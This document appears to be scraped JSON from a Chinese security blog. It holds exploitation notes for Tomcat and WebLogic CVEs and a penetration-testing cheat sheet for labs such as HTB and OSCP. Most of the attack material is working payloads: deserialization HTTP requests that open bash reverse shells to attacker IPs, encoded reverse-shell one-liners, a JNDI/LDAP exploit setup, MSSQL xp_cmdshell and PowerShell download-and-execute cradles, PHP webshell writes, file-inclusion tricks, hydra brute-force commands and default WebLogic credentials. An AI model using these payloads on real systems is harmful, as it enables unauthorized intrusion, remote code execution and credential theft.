和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。\u003c/p\u003e\n\u003ch1 id=\"二漏洞介绍与利用\"\u003e二、漏洞介绍与利用\u003c/h1\u003e\n\u003ch2 id=\"1put文件上传-cve-2017-12615\"\u003e1、PUT文件上传 CVE-2017-12615\u003c/h2\u003e\n\u003cp\u003e主要影响版本：\u003c/p\u003e\n\u003cp\u003eTomcat 7.0.0-7.0.81\u003c/p\u003e\n\u003cp\u003ePOC：此漏洞较为简单，可梭哈\u003c/p\u003e\n\u003cp\u003eTomcat 7.0.0-7.0.81\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePOC：\r\nPUT /1.txt/ HTTP/1.1\r\nHost: 192.168.2.66:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\r\nAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\r\nReferer: http://192.168.2.66:8080/tomcat.css\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nConnection: close\r\nContent-Length: 3\r\n\r\ncxk\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"2ajp文件包含\"\u003e2、AJP文件包含\u003c/h2\u003e\n\u003cp\u003e由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。\u003c/p\u003e","title":"Tomcat"},{"content":"一、Weblogic Weblogic 是美国 Oracle 公司出品的应用服务器软件，确切的说这是基于 Java EE 架构的中间件，主要用于开发、继承、部署和管理大型分布式 web 应用、网络应用和数据库应用。Weblogic 将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的 Java 应用服务器软件之一，也是世界上第一个成功商业化的 Java EE 应用服务器，当然 Weblogic 具有可扩展性、快速开发、灵活可靠等优势，其默认端口为7001，目前比较活跃的版本为10和12，最新版本为14。\n在功能性上，Weblogic 是 Java EE 的全能应用服务器，包括 EJB、JSP、servlet、JMS 等，是商业软件中排名第一的容器（JSP、servlet、EJB等），并提供其他工具（例如Java编辑器），因此也是一个综合的开发以及运行环境。在扩展性上，Weblogic Server 凭借出色的群集技术，拥有处理关键 web 应用系统问题所需的性能、扩展性和高可用性。Weblogic Server 既实现了网页集群，也实现了EJB组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集还是组建群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。\n二、漏洞介绍与利用 1、wls-wsat XMLDecoder 反序列化漏洞（CVE-2017-10271） Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。\n影响版本\n10.3.6.0.0\n12.1.3.0.0\n12.2.1.1.0\n12.2.1.2.0\n检测方式：\nPOC:\n反弹shell记得编码：\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\rHost: your-ip:7001\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\rConnection: close\rContent-Type: text/xml\rContent-Length: 633\r\u0026lt;soapenv:Envelope xmlns:soapenv=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt; \u0026lt;soapenv:Header\u0026gt;\r\u0026lt;work:WorkContext xmlns:work=\u0026#34;http://bea.com/2004/06/soap/workarea/\u0026#34;\u0026gt;\r\u0026lt;java version=\u0026#34;1.4.0\u0026#34; class=\u0026#34;java.beans.XMLDecoder\u0026#34;\u0026gt;\r\u0026lt;void class=\u0026#34;java.lang.ProcessBuilder\u0026#34;\u0026gt;\r\u0026lt;array class=\u0026#34;java.lang.String\u0026#34; length=\u0026#34;3\u0026#34;\u0026gt;\r\u0026lt;void index=\u0026#34;0\u0026#34;\u0026gt;\r\u0026lt;string\u0026gt;/bin/bash\u0026lt;/string\u0026gt;\r\u0026lt;/void\u0026gt;\r\u0026lt;void index=\u0026#34;1\u0026#34;\u0026gt;\r\u0026lt;string\u0026gt;-c\u0026lt;/string\u0026gt;\r\u0026lt;/void\u0026gt;\r\u0026lt;void index=\u0026#34;2\u0026#34;\u0026gt;\r\u0026lt;string\u0026gt;bash -i \u0026amp;gt;\u0026amp;amp; /dev/tcp/10.0.0.1/21 0\u0026amp;gt;\u0026amp;amp;1\u0026lt;/string\u0026gt;\r\u0026lt;/void\u0026gt;\r\u0026lt;/array\u0026gt;\r\u0026lt;void method=\u0026#34;start\u0026#34;/\u0026gt;\u0026lt;/void\u0026gt;\r\u0026lt;/java\u0026gt;\r\u0026lt;/work:WorkContext\u0026gt;\r\u0026lt;/soapenv:Header\u0026gt;\r\u0026lt;soapenv:Body/\u0026gt;\r\u0026lt;/soapenv:Envelope\u0026gt; 写shell POC：\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\rHost: your-ip:7001\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\rConnection: close\rContent-Type: text/xml\rContent-Length: 638\r\u0026lt;soapenv:Envelope xmlns:soapenv=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt;\r\u0026lt;soapenv:Header\u0026gt;\r\u0026lt;work:WorkContext xmlns:work=\u0026#34;http://bea.com/2004/06/soap/workarea/\u0026#34;\u0026gt;\r\u0026lt;java\u0026gt;\u0026lt;java version=\u0026#34;1.4.0\u0026#34; class=\u0026#34;java.beans.XMLDecoder\u0026#34;\u0026gt;\r\u0026lt;object class=\u0026#34;java.io.PrintWriter\u0026#34;\u0026gt; \u0026lt;string\u0026gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp\u0026lt;/string\u0026gt;\r\u0026lt;void method=\u0026#34;println\u0026#34;\u0026gt;\u0026lt;string\u0026gt;\r\u0026lt;![CDATA[\r\u0026lt;% out.print(\u0026#34;test\u0026#34;); %\u0026gt;\r]]\u0026gt;\r\u0026lt;/string\u0026gt;\r\u0026lt;/void\u0026gt;\r\u0026lt;void method=\u0026#34;close\u0026#34;/\u0026gt;\r\u0026lt;/object\u0026gt;\u0026lt;/java\u0026gt;\u0026lt;/java\u0026gt;\r\u0026lt;/work:WorkContext\u0026gt;\r\u0026lt;/soapenv:Header\u0026gt;\r\u0026lt;soapenv:Body/\u0026gt;\r\u0026lt;/soapenv:Envelope\u0026gt; 2、WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628） Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。\n检测方式，该漏洞无回显，无法直接梭哈：\n利用方式：\n开启恶意\njava -cp ysoserial-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command] java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 \u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\u0026#34; 3、Weblogic 任意文件上传漏洞（CVE-2018-2894） Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。\n利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。\n注意：该漏洞工具可做检测，但需要手动上传webshell\n修改工作目录：\n/ws_utc/config.do\r/ws_utc/begin.do 利用方法类似，直接上传即可 /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。 上传webshell即可：\n路径为：/ws_utc/css/config/keystore/[时间戳]_[文件名]\n4、Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883） 这个漏洞是个组合漏洞，前提是具有\n工具无法梭哈，\n第一步未授权路径： console/css/%252e%252e%252fconsole.portal 第二步，命令执行 Weblogic 12.2.1以上版本： 注意URL编码，使用hackbar成功率高一些，这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类：\nconsole/css/%252e%252e%252fconsole.portal?_nfpb=true\u0026amp;_pageLabel=\u0026amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(\u0026#34;java.lang.Runtime.getRuntime().exec(\u0026#34;bash%20-c%20%7Becho,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-i%7D\u0026#34;);\u0026#34;) 通杀利用方式 XML远程加载： XML：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt;\r\u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34;\rxmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\rxsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt;\r\u0026lt;bean id=\u0026#34;pb\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34; init-method=\u0026#34;start\u0026#34;\u0026gt;\r\u0026lt;constructor-arg\u0026gt;\r\u0026lt;list\u0026gt;\r\u0026lt;value\u0026gt;bash\u0026lt;/value\u0026gt;\r\u0026lt;value\u0026gt;-c\u0026lt;/value\u0026gt;\r\u0026lt;value\u0026gt;\u0026lt;![CDATA[bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.2.40/8888 0\u0026gt;\u0026amp;1]]\u0026gt;\u0026lt;/value\u0026gt;\r\u0026lt;/list\u0026gt;\r\u0026lt;/constructor-arg\u0026gt;\r\u0026lt;/bean\u0026gt;\r\u0026lt;/beans\u0026gt; POC：\nconsole/css/%252e%252e%252fconsole.portal?_nfpb=true\u0026amp;_pageLabel=\u0026amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\u0026#34;http://192.168.2.40:8000/1.xml\u0026#34;) 5、Weblogic未授权远程代码执行漏洞 (CVE-2023-21839) CVE-2023-21839 允许远程用户在未经授权的情况下通过 IIOP/T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞\n无法梭哈发现，需要单独检测，但是工具存在不稳的情况，最好多点几下，同时无法检查无回显的洞\n第一步，开启LDAP恶意服务： java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.2.40 第二步，发送POC： 是4ra1n的go编写单独工具：\nmain.exe -ip 192.168.2.66 -port 7001 -ldap ldap://192.168.2.40:1389/Basic/ReverseShell/192.168.2.40/8888 或者使用sxf工具梭哈： 6、SSRF(CVE-2014-4210） SSRF POC：\n坑点：注意空格\nGET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name\u0026amp;txtSearchname=sdf\u0026amp;txtSearchkey=\u0026amp;txtSearchfor=\u0026amp;selfor=Business+location\u0026amp;btnSubmit=Search\u0026amp;operator=http://192.168.2.40:8000/a HTTP/1.1\rHost: 192.168.2.66:7001\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\rConnection: close\rContent-Length: 0 内网探测以及Redis反弹详见SSRF漏洞\n7、解密应用 ①任意文件读取\nweblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml（基于当前目录/root/Oracle/Middleware/user_projects/domains/base_domain）\nPOC：\rGET /hello/file.jsp?path=security/SerializedSystemIni.dat HTTP/1.1\rHost: 192.168.2.66:7001\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\rAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\rReferer: http://192.168.2.66:7001/console/login/LoginForm.jsp\rAccept-Encoding: gzip, deflate\rAccept-Language: zh-CN,zh;q=0.9\rCookie: ADMINCONSOLESESSION=yRjrkPJPJxb1vQ81c2dxkyGhxNJW1hW2Xpdbc2yy45290T911Gjx!1637882379\rConnection: close 密钥配置文件：\n/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat 存放加密密码的文件：\n/root/Oracle/Middleware/user_projects/domains/base_domain/config/config.xml\r/root/Oracle/Middleware/user_projects/domains/base_domain/security/boot.properties 坑点：\n同时，使用sxf解密工具也可进行解密：\n②数据库密码获取\n数据库文件\n/root/Oracle/Middleware/user_projects/domains/base_domain/config/jdbc/tide-jdbc.xml\r/root/Oracle/Middleware/user_projects/domains/base_domain/security/boot.properties 同时还有多种解密方式，jsp类的\n8、后台war包部署 通过弱密码OR文件包含读取密码等方式，成功登录后台\n常见弱密码：\nsystem:password weblogic:weblogic admin:secruity\rjoe:password mary:password system:sercurity\rwlcsystem: wlcsystem weblogic:Oracle@123 生成war包，压缩为zip文件，重命名为war\n然后狂点下一步：\n","permalink":"https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/weblogic/","summary":"\u003ch1 id=\"一weblogic\"\u003e一、Weblogic\u003c/h1\u003e\n\u003cp\u003eWeblogic 是美国 Oracle 公司出品的应用服务器软件，确切的说这是基于 Java EE 架构的中间件，主要用于开发、继承、部署和管理大型分布式 web 应用、网络应用和数据库应用。Weblogic 将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的 Java 应用服务器软件之一，也是世界上第一个成功商业化的 Java EE 应用服务器，当然 Weblogic 具有可扩展性、快速开发、灵活可靠等优势，其默认端口为7001，目前比较活跃的版本为10和12，最新版本为14。\u003c/p\u003e\n\u003cp\u003e在功能性上，Weblogic 是 Java EE 的全能应用服务器，包括 EJB、JSP、servlet、JMS 等，是商业软件中排名第一的容器（JSP、servlet、EJB等），并提供其他工具（例如Java编辑器），因此也是一个综合的开发以及运行环境。在扩展性上，Weblogic Server 凭借出色的群集技术，拥有处理关键 web 应用系统问题所需的性能、扩展性和高可用性。Weblogic Server 既实现了网页集群，也实现了EJB组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集还是组建群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。\u003c/p\u003e\n\u003ch1 id=\"二漏洞介绍与利用\"\u003e二、漏洞介绍与利用\u003c/h1\u003e\n\u003ch2 id=\"1wls-wsat-xmldecoder-反序列化漏洞cve-2017-10271\"\u003e1、wls-wsat XMLDecoder 反序列化漏洞（CVE-2017-10271）\u003c/h2\u003e\n\u003cp\u003eWeblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。\u003c/p\u003e\n\u003cp\u003e影响版本\u003c/p\u003e\n\u003cp\u003e10.3.6.0.0\u003c/p\u003e\n\u003cp\u003e12.1.3.0.0\u003c/p\u003e\n\u003cp\u003e12.2.1.1.0\u003c/p\u003e\n\u003cp\u003e12.2.1.2.0\u003c/p\u003e\n\u003cp\u003e检测方式：\u003c/p\u003e\n\u003cp\u003ePOC:\u003c/p\u003e\n\u003cp\u003e反弹shell记得编码：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePOST /wls-wsat/CoordinatorPortType HTTP/1.1\r\nHost: your-ip:7001\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\nConnection: close\r\nContent-Type: text/xml\r\nContent-Length: 633\r\n\r\n\u0026lt;soapenv:Envelope xmlns:soapenv=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt; \u0026lt;soapenv:Header\u0026gt;\r\n\u0026lt;work:WorkContext xmlns:work=\u0026#34;http://bea.com/2004/06/soap/workarea/\u0026#34;\u0026gt;\r\n\u0026lt;java version=\u0026#34;1.4.0\u0026#34; class=\u0026#34;java.beans.XMLDecoder\u0026#34;\u0026gt;\r\n\u0026lt;void class=\u0026#34;java.lang.ProcessBuilder\u0026#34;\u0026gt;\r\n\u0026lt;array class=\u0026#34;java.lang.String\u0026#34; length=\u0026#34;3\u0026#34;\u0026gt;\r\n\u0026lt;void index=\u0026#34;0\u0026#34;\u0026gt;\r\n\u0026lt;string\u0026gt;/bin/bash\u0026lt;/string\u0026gt;\r\n\u0026lt;/void\u0026gt;\r\n\u0026lt;void index=\u0026#34;1\u0026#34;\u0026gt;\r\n\u0026lt;string\u0026gt;-c\u0026lt;/string\u0026gt;\r\n\u0026lt;/void\u0026gt;\r\n\u0026lt;void index=\u0026#34;2\u0026#34;\u0026gt;\r\n\u0026lt;string\u0026gt;bash -i \u0026amp;gt;\u0026amp;amp; /dev/tcp/10.0.0.1/21 0\u0026amp;gt;\u0026amp;amp;1\u0026lt;/string\u0026gt;\r\n\u0026lt;/void\u0026gt;\r\n\u0026lt;/array\u0026gt;\r\n\u0026lt;void method=\u0026#34;start\u0026#34;/\u0026gt;\u0026lt;/void\u0026gt;\r\n\u0026lt;/java\u0026gt;\r\n\u0026lt;/work:WorkContext\u0026gt;\r\n\u0026lt;/soapenv:Header\u0026gt;\r\n\u0026lt;soapenv:Body/\u0026gt;\r\n\u0026lt;/soapenv:Envelope\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/zj_img/WEBRESOURCE82c2c4952a93c896bb4a2d5db2359a53%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"Weblogic"},{"content":"靶场的关注重点相比实战会更为细节：\n1、域名； 2、网站技术架构cms等； 3、目录； 4、弱口令或者默认口令，弱密码不多，但是需要组合，注意用户名大小写，密码名字复用 5、敏感组合拳信息； 6、web漏洞；\nFUZZ host域名碰撞\nffuf -u \u0026#34;http://flight.htb\u0026#34; -H \u0026#34;Host: FUZZ.flight.htb\u0026#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229 WFUZZ: sudo wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://sudocuong.com/workinginprogress.php?FUZZ=id --hw=0(看说明) 子域名爆破 wfuzz -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u streetfighterclub.htb -H \u0026#34;Host: FUZZ.streetfighterclub.htb\u0026#34; --hw 717 目录扫描： 正常扫描，如果没有东西，又没有其他入口，考虑加大字典、换工具、以及二级目录，各种状态码都有值得一看的必要：\ngobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.5.104/ -x php,aspx,jsp,html,js gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.63/ -m HEAD -t 100 --no-error -x php,aspx,jsp,html,js dirsearch -u http://192.168.154.129/ 漏洞字典： /usr/share/wordlists/dirb/vulns/sharepoint.txt oscp优化： dirsearch -u http://192.168.192.141/ --wordlists=/usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt 这个效果一般 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.192.141/ -x php,txt -x php,js,html -m HEAD -t 50 最后版本： gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.225.153:8000/partner/ -t 1000 --no-error -b 404,503 http爆破： 表单： hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form \u0026#34;/department/login.php:username=^USER^password=^PASS^:F=Invalid\u0026#34; -t 64 hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form \u0026#34;/index.php:fm_usr=user\u0026amp;fm_pwd=^PASS^:Login failed. Invalid\u0026#34; 摘要认证： hydra -L 1.txt -P 1.txt 192.168.154.131 http-get /webdav sql注入： mysql 连接： mysql -h10.0.0.1 -uroot -p123 mysql -u school -p\u0026#39;@jCma4s8ZM\u0026lt;?kA\u0026#39; -h localhost 基础语法： 查库名： union select group_concat(database())# 查表名： union select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;library\u0026#39;# 查列名： union select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;access\u0026#39; # 查数据： union select group_concat(\u0026#39;\\n\u0026#39;,id,\u0026#39;\\n\u0026#39;,service,\u0026#39;\\n\u0026#39;,username,\u0026#39;\\n\u0026#39;,password) from access # 写入： 1\u0026#34;UNION SELECT 1,2,\u0026#34;\u0026lt;?php system($_REQUEST[\u0026#39;a\u0026#39;]);?\u0026gt;\u0026#34; into outfile \u0026#39;C:/inetpub/wwwroot/cxk5.php\u0026#39;# 手动测试流程： 判断是否有注入： 1\u0026#39;-- - 1\u0026#34;-- - \u0026#39; or 1=1 -- - 判断列数： -1\u0026#39; order by 1-- - -1\u0026#39; union select 1,2,3,4,5-- - mysql爆数据： group_concat(schema_name) from information_schema.schemata --+ 查询库名 group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;webapphacking\u0026#39; --+ 查询表名 group_concat(column_name) from information_schema.columns where table_name=\u0026#39;表名\u0026#39; --+ 查询列名 mssql mssql爆数据： https://www.cnblogs.com/-meditation-/articles/16112699.html https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet 值得注意的知识点： sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。 syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。 如果你想在当前数据库上下文中查询名为 Hub_DB的数据库中的表名，你可以使用 Hub_DB..sysobjects 的语法来引用 Hub_DB 数据库中的系统表 sysobjects。这样的查询将会返回 Hub_DB 数据库中所有对象的信息，包括表、视图、存储过程等。 Hub_DB..syscolumns同理 表名很多参考id值，爆表名时记得把ID也爆出来 关键词：Warning Query 普通盲注： \u0026#39; AND IF (1=1, sleep(3),\u0026#39;false\u0026#39;) -- \u0026#39; OR NOT 1251=1251# \u0026#39; AND IF (1=1, sleep(3),\u0026#39;false\u0026#39;) -- 简化xp_cmd: 一条： EXEC sp_configure \u0026#39;show advanced options\u0026#39;,1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;,1;RECONFIGURE; 二条 EXEC master.dbo.xp_cmdshell \u0026#39;ping 192.168.45.240\u0026#39;; 盲注开启xp_cmd: curl members.streetfighterclub.htb/old/verify.asp -d \u0026#34;username=test\u0026amp;password=test\u0026amp;logintype=64738;EXEC+sp_configure+\u0026#39;show+advanced+options\u0026#39;,1;EXEC+sp_configure+\u0026#39;Xp_cmdshell\u0026#39;,1;RECONFIGURE;+--\u0026#39;;\u0026amp;B1=LogIn\u0026#34; 关闭xp_cmd: curl members.streetfighterclub.htb/old/verify.asp -d \u0026#34;username=test\u0026amp;password=test\u0026amp;logintype=64738;EXEC+sp_configure+\u0026#39;show+advanced+options\u0026#39;,1;EXEC+sp_configure+\u0026#39;Xp_cmdshell\u0026#39;,0;RECONFIGURE;+--\u0026#39;;\u0026amp;B1=LogIn\u0026#34; 验证： sudo tcpdump -nni tun0 icmp username=a\u0026amp;password=a\u0026amp;logintype=1;EXEC+Xp_cmdshell+\u0026#39;ping+10.10.16.5\u0026#39;;\u0026amp;B1=LogIn 反弹shell: EXEC master.dbo.xp_cmdshell \u0026#34;powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.45.175/nishang.ps1\u0026#39;)\u0026#34;; xp_cmd命令执行16进制编码，不一定成功\n网站：https://kw360.net/ox2str/\n;declare @x char(8000);set @x=706f7765727368656c6c2b696578286e65772d6f626a6563742b6e65742e776562636c69656e74292e646f776e6c6f6164737472696e672822687474703a2f2f31302e31302e31362e352f496e766f6b652d506f7765725368656c6c5463702e7073312229;waitfor exec master..xp_cmdshell @x 获取shell的脚本，原理为通过监听web，base64编码的URL来实现回显：\nhttps://gist.github.com/xassiz/51f392afbe1c0374a008fa85d621455e 注意事项： url要带/，最好为443端口 其中一行改为： payload += \u0026#34;set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path(\u0026#39;\u0026#39;)), 1, 1, \u0026#39;\u0026#39;)) as varbinary(max)) FOR XML PATH(\u0026#39;\u0026#39;), BINARY BASE64);\u0026#34; 注意xp_cmd的大小写 json格式下的sql注入：\n转换成unioncode编码即可 https://www.zxgj.cn/g/unicode MSSQL文件写入，适用于不出网场景\n将要写入的二进制文件变成16进制\n#!/usr/bin/env python # coding=utf-8 import urllib import binascii import sys import os def str2hex(string): hexstr=binascii.b2a_hex(bytes(string, encoding=\u0026#39;utf-8\u0026#39;)) out = bytes(\u0026#34;0x\u0026#34;, encoding=\u0026#39;utf-8\u0026#39;) out = out + hexstr print(out) def b2a(filename): with open(filename,\u0026#39;rb\u0026#39;) as f: hexstr=binascii.b2a_hex(f.read()) out = bytes(\u0026#34;0x\u0026#34;, encoding=\u0026#39;utf-8\u0026#39;) out = out + hexstr print(out) if __name__==\u0026#34;__main__\u0026#34;: filename = sys.argv[1] if os.path.exists(filename): b2a(filename) else: str2hex(filename) 不出网文件落地，nc可落地，sql语句：\nsp_configure \u0026#39;show advanced options\u0026#39;, 1; RECONFIGURE; sp_configure \u0026#39;Ole Automation Procedures\u0026#39;, 1; RECONFIGURE; DECLARE @ObjectToken INT EXEC sp_OACreate \u0026#39;ADODB.Stream\u0026#39;, @ObjectToken OUTPUT EXEC sp_OASetProperty @ObjectToken, \u0026#39;Type\u0026#39;, 1 EXEC sp_OAMethod @ObjectToken, \u0026#39;Open\u0026#39; EXEC sp_OAMethod @ObjectToken, \u0026#39;Write\u0026#39;, NULL, 0xhex（替换这里的内容） EXEC sp_OAMethod @ObjectToken, \u0026#39;SaveToFile\u0026#39;, NULL, \u0026#39;c:\\windows\\system32\\spool\\drivers\\color\\nc.exe\u0026#39;, 2 EXEC sp_OAMethod @ObjectToken, \u0026#39;Close\u0026#39; EXEC sp_OADestroy @ObjectToken Postgre SQL Database https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md\n命令执行：\n3\u0026#39;;DROP TABLE IF EXISTS output;CREATE TABLE output(data text);COPY output FROM PROGRAM \u0026#39;/bin/bash -c \u0026#39;\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.45.240/445 0\u0026gt;\u0026amp;1\u0026#39;\u0026#39;\u0026#39;;-- 字典收集 cewl 192.168.154.131 -w 1.txt #cewl收集的字典可能存在大小写的问题，值得注意，但是可以自己调参数 常用的英语弱密码字典： https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt 本地登录 x-forwarded-for字段\nfirefox modheader插件 文件包含 文件包含 本地文件包含：\n思路： 主要是读取文件，两个思路：1、读取敏感信息；2、想办法写木马读取，利用日志、session等方式。 读取文件： windows目录： C:\\Windows\\win.ini 在实际操作中，/Windows/win.ini可能可以生效 以及使用curl -x get的方式进行访问，浏览器得打开源码，没有这个方便。 Linux： 读取/home/daniela/.ssh/id_rsa 1、base64: ?file1=php://filter/read=convert.base64-encode/resource=flag.php ?page=php://filter/convert.base64-encode/resource=admin.php 2、data://代码执行 ?page=data://text/plain,\u0026lt;?php%20echo%20system(\u0026#39;ls\u0026#39;);?\u0026gt; 3、base64代码执行： ?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==\u0026amp;cmd=ls 写入木马： 1、UA配合accesslog，这种方式大概率只能用一次！！ apache默认日志目录： /var/log/apache2/access.log burp修改UA： \u0026lt;?php echo system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; \u0026amp;号传参 2、session配合 php的session存储和格式如下： C:\\Windows\\TEMP\\sess_\u0026lt;cookie\u0026gt; 远程文件包含：\n开启HTTP服务，直接反弹shell 伪协议读文件 php://filter/read=convert.base64-encode/resource= php命令执行： \u0026lt;?=`whoami`?\u0026gt; base64: 注意一些特殊的字符，比如\\n啥的，可以换成\\T之类的名字，防止出现bug echo \u0026#34;wget http://10.10.16.9/nc.exe -o C:\\\\Windows\\\\TEMP\\\\T.exe\u0026#34; | iconv -t UTF-16LE | base64 \u0026lt;?=`powershell /enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAAp AC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAaAB0AHQAcAA6AC8ALwAxADAALgAxADAA 